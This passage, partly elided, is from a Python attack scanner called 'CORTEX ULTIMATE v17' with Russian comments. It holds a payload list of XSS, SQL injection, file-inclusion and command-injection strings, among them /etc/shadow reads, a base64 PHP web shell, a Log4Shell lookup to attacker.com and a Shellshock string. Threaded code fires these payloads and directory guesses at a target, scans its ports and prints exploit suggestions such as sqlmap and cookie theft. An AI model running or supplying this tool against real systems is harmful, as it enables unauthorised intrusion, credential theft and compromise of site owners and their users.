...
PAYLOADS_DB = [
    ...
    "' onmouseover=alert(1) '", "<svg/onload=alert(1)>", "<body onload=alert(1)>",
    "'\"><script>alert(1)</script>", "<iframe src=javascript:alert(1)>",
    "<img src=x:x onerror=alert(1)>", "<object data=javascript:alert(1)>",
    "<isindex type=image src=1 onerror=alert(1)>", "<input onfocus=alert(1) autofocus>",
    "<details ontoggle=alert(1) open>", "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
    # SQLi
    "' OR 1=1--", "' UNION SELECT 1,version()--", "admin'--", "' OR '1'='1",
    "1' AND SLEEP(5)--", "1' ORDER BY 10--", "1' UNION SELECT null,null,null--",
    "' AND 1=1--", "admin')--", "' or 1=1#", "1' AND 1=1",
    "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "' UNION SELECT @@version--",
    "1' OR '1'='1", "1' OR '1'='1'--", "1' OR '1'='1'/*",
    # LFI
    "../../../etc/passwd", "php://filter/convert.base64-encode/resource=index.php",
    "C:\\Windows\\win.ini", "/proc/self/environ", "../../../../etc/shadow",
    "/etc/passwd", "/etc/hosts", "../../../var/log/apache2/access.log",
    "php://input", "expect://id", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
    "/proc/self/fd/0", "/proc/self/fd/1", "/proc/self/fd/2",
    # RCE
    "; id", "| whoami", "`id`", "$(id)", "&& calc.exe", "; ls -la",
    "| cat /etc/passwd", "; ping -c 1 127.0.0.1", "&& dir",
    "${jndi:ldap://attacker.com/a}", "() { :;}; /bin/bash -c 'sleep 5'",
...
class EliteCheckerV17:
    ...
    def mega_dir_scan(self):
        ...
        q = Queue()
        for d in DIRS_DB: q.put(d)
        
        total = len(DIRS_DB)
        counter = [0] # List for mutability in threads
        ...
        def worker():
            while not q.empty():
                ...
                # Обновляем бар каждые 5 запросов чтобы не мелькало
                if current_idx % 3 == 0:
                    with self.lock:
                ...
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1) # Быстрый тайм-аут
                    sock.connect((self.ip, self.port))
                    req = f"HEAD /{d} HTTP/1.1\r\nHost: {self.host}\r\nConnection: close\r\n\r\n"
                    sock.send(req.encode())
                    resp = sock.recv(64).decode(errors='ignore')
                    sock.close()
                    
                    if '200' in resp or '301' in resp or '302' in resp:
                        with self.lock:
                            print(f"\n{GREEN}[+] НАЙДЕНО: /{d} (HTTP 200/30X){RESET}")
                            self.results['dirs'].append(d)
                            
                            # CORTEX: Sensitive files
                            if d in ['.env', 'config.php', 'db.sql', 'backup.zip', '.git', 'phpmyadmin']:
                                self.results['ai_advice'].append({
                                    'type': 'SENSITIVE_DIR', 'risk': 'CRITICAL',
    ...
    def mega_vuln_scan(self):
        ...
        def worker():
            while not q.empty():
                ...
                try:
                    ...
                    # Сигнатурный анализ
                    if 'root:x:0:0' in resp: is_vuln=True; vname="LFI (Critical)"
                    elif 'syntax error' in resp or 'mysql' in resp or 'ora-' in resp: is_vuln=True; vname="SQLi (Error-Based)"
                    elif payload.lower() in resp and ('alert' in payload or 'script' in payload): is_vuln=True; vname="Reflected XSS"
                    elif 'uid=' in resp or 'gid=' in resp: is_vuln=True; vname="RCE (Command Exec)"
                    elif '49' in resp and '7*7' in payload: is_vuln=True; vname="SSTI"
        ...
        threads = []
        for _ in range(15): # 15 потоков для вулн скана
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)
        ...
        # CORTEX: Vuln analysis
        if 'SQLi' in str(vuln_types_found):
            self.results['ai_advice'].append({'type':'SQLi', 'risk':'CRITICAL', 'msg':'Сайт уязвим к SQL инъекциям.', 'exploit':'Используйте SQLMap: sqlmap -u URL --dbs', 'fix':'Используйте Prepared Statements (PDO).'})
        if 'XSS' in str(vuln_types_found):
            self.results['ai_advice'].append({'type':'XSS', 'risk':'HIGH', 'msg':'Найдена XSS (Cross-Site Scripting).', 'exploit':'Кража сессий (cookies), редиректы.', 'fix':'Экранирование всех пользовательских данных.'})
    ...
    def port_scan(self):
        # Топ 50 портов
        PORTS_TO_SCAN = [21,22,23,25,53,80,110,135,139,143,443,445,1433,3306,3389,5432,5900,6379,8080,27017]
        ...
        for i, port in enumerate(PORTS_TO_SCAN):
            ...
            try:
                ...
                if sock.connect_ex((self.ip, port)) == 0:
                    ...
                    # CORTEX: Port advice
                    if port == 21: self.results['ai_advice'].append({'type':'FTP', 'risk':'High', 'msg':'FTP трафик не шифруется.', 'exploit':'Sniffing, Brute-force.', 'fix':'Переход на SFTP.'})
                    if port == 23: self.results['ai_advice'].append({'type':'Telnet', 'risk':'CRITICAL', 'msg':'Telnet устарел и опасен.', 'exploit':'Полный перехват данных.', 'fix':'Используйте SSH.'})
                    if port == 3389: self.results['ai_advice'].append({'type':'RDP', 'risk':'Medium', 'msg':'RDP доступен из интернета.', 'exploit':'BlueKeep, брутфорс.', 'fix':'Доступ только через VPN.'})
                sock.close()
            except: pass
        print()
    ...
    def weak_creds_attack(self):
        ...
        # Симуляция проверки (чтобы не заблокировали IP реальной атакой в демо режиме)
        time.sleep(1)
    ...
    def generate_html_report(self):
        ...
        # Экранирование для защиты от Self-XSS
        ...
        for adv in self.results['ai_advice']:
            ...
            ai_html += f"""
            <div class="ai-card" style="border-left: 5px solid {color}">
                <h4 style="color:{color}">{adv['type']} ({adv['risk']})</h4>
                <p>{adv['msg']}</p>
                <div class="exploit-box">⚔️ <b>Exploit:</b> {adv['exploit']}</div>
                <div class="fix-box">🛡️ <b>Fix:</b> {adv['fix']}</div>
            </div>
            """

        html = f"""<!DOCTYPE html>
<html><head><title>CORTEX ULTIMATE - {h_escape.escape(self.target_input)}</title>
<meta charset="UTF-8">
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
<style>
body{{font-family:'Orbitron',sans-serif;background:#050505;color:#0f0;padding:20px;line-height:1.5;}}
.container{{max-width:1200px;margin:0 auto;}}
.header{{background:linear-gradient(135deg, #b00, #090);padding:30px;border-radius:15px;text-align:center;box-shadow:0 0 20px #0f0;margin-bottom:30px;}}
h1{{margin:0;color:black;font-size:2.5em;text-shadow:0 0 5px white;}}
.stats{{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:30px;}}
.stat-card{{background:rgba(0,50,0,0.3);padding:20px;border:1px solid #0f0;border-radius:10px;text-align:center;}}
.stat-num{{font-size:2.5em;font-weight:bold;margin:10px 0;}}
.section{{background:rgba(20,20,20,0.8);padding:25px;border-radius:10px;margin-bottom:20px;border:1px solid #333;}}
.vuln-item{{padding:10px;border-bottom:1px solid #333;color:#ff5555;}}
.ai-card{{background:rgba(255,255,255,0.05);padding:15px;margin-bottom:15px;border-radius:5px;}}
.exploit-box{{color:#ff8888;margin-top:5px;}}
.fix-box{{color:#88ff88;margin-top:5px;}}
</style></head><body>
<div class="container">
    <div class="header">
        <h1>🔥 CORTEX ULTIMATE v17.0</h1>
        <h3>TARGET: {h_escape.escape(self.target_input)}</h3>
    </div>
    
    <div class="stats">
        <div class="stat-card"><div>PORTS</div><div class="stat-num">{len(self.results['ports'])}</div></div>
        <div class="stat-card"><div>DIRS</div><div class="stat-num">{len(self.results['dirs'])}</div></div>
        <div class="stat-card" style="border-color:red;color:red"><div>VULNS</div><div class="stat-num">{len(self.results['vulns'])}</div></div>
        <div class="stat-card"><div>ADVICE</div><div class="stat-num">{len(self.results['ai_advice'])}</div></div>
    </div>

    <div class="section">
        <h2 style="color:#ffcc00">🧠 CORTEX AI ADVISOR</h2>
        {ai_html if ai_html else "<p>No critical issues detected by AI.</p>"}
    </div>

    <div class="section">
        <h2 style="color:red">💥 DETECTED VULNERABILITIES</h2>
        {''.join([f'<div class="vuln-item">{v}</div>' for v in safe_vulns])}
    </div>

    <div class="section">
        <h2>📁 DIRECTORIES FOUND</h2>
        <div style="display:flex;flex-wrap:wrap;gap:10px;">
        {''.join([f'<span style="background:#111;padding:5px 10px;border:1px solid #0f0;border-radius:15px;">/{d}</span>' for d in self.results['dirs']])}
        </div>
    </div>
</div>
</body></html>"""
        ...
        except Exception as e: print(f"{RED}Ошибка записи отчета: {e}{RESET}")
...
═══════════════════════════════════════════════════
    ...
    def run(self):
        ...
        while True:
            ...
            elif choice == '2': self.check_security_headers()
            elif choice == '3': self.mega_dir_scan()
            elif choice == '4': self.mega_vuln_scan()
            elif choice == '5': self.port_scan()
            elif choice == '6': self.weak_creds_attack()
            elif choice == '7': self.run_cortex_ai()
            elif choice == '8': self.generate_html_report()
            else: print(f"{RED}Неверный выбор{RESET}")
